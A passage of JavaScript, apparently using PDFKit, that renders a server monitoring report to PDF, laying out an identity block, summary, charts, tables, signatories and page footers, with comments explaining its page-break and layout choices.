    doc.fillColor(INK).font(F.bold).fontSize(15)
      .text(renderable(report.title), { width: right - left });
    doc.moveDown(0.4);

    // ── Identity block ──
    // Label/value pairs rather than free text, because these are fields ICTU named:
    // server, IP, OS, monitoring period, date created, responsible. Labels are set in
    // a darker ink than the values they introduce would suggest — the label is the
    // thing a reader scans for.
    const LABEL_W = 140;
    doc.font(F.reg).fontSize(BODY_PT);
    for (const m of metaRows(report)) {
      const y = doc.y;
      doc.fillColor(MUTED).text(renderable(`${m.label}:`), left, y, {
        width: LABEL_W, lineBreak: false,
      });
      doc.fillColor(INK).text(renderable(m.value ?? "—"), left + LABEL_W, y, {
        width: right - left - LABEL_W,
      });
      // text() with a width advances doc.y by the wrapped height, so a long value
      // (a full OS string) pushes the next row down instead of overprinting it.
      doc.x = left;
    }
    doc.moveDown(0.8);

    // ── Summary ──
    if (report.summary?.length) {
      doc.fillColor(INK).font(F.bold).fontSize(HEADING_PT).text("Summary");
      doc.moveDown(0.3);
      doc.font(F.reg).fontSize(BODY_PT);
      report.summary.forEach((s) => {
        doc.fillColor(MUTED).text(renderable(`${s.label}: `), { continued: true });
        doc.fillColor(INK).text(renderable(s.value));
      });
      doc.moveDown(0.8);
    }

    // ── Charts ──
    // Between the summary and the tables on purpose: a reader sees the shape of the
    // period first, then the numbers that produced it. Drawn as vectors, so they stay
    // sharp when printed and add no dependency.
    for (const chart of report.charts ?? []) {
      const need = chartHeight(chart);
      // Keep a chart whole. Half a plot at the foot of a page with its axis overleaf is
      // worse than starting it on the next one.
      if (doc.y + need > doc.page.height - doc.page.margins.bottom - 30) doc.addPage();
      drawChart(doc, chart, { font: F.reg, bold: F.bold });
    }

    // ── Tables ──
    sections(report).forEach((s, i) => {
      if (i > 0) doc.moveDown(1);
      // A heading stranded at the foot of a page is worse than an early break.
      if (doc.y > doc.page.height - doc.page.margins.bottom - 60) doc.addPage();
      doc.fillColor(INK).font(F.bold).fontSize(HEADING_PT).text(renderable(s.title));
      doc.moveDown(0.3);
      if (s.columns.length && s.rows.length) {
        drawTable(doc, s.columns, s.rows);
      } else {
        doc.font(F.reg).fontSize(BODY_PT).fillColor(MUTED)
          .text("No data for the selected period.");
      }
    });

    drawSignatories(doc, report.signatories);

    drawPageFooters(doc, report);
    doc.flushPages();

    doc.end();
  });
}
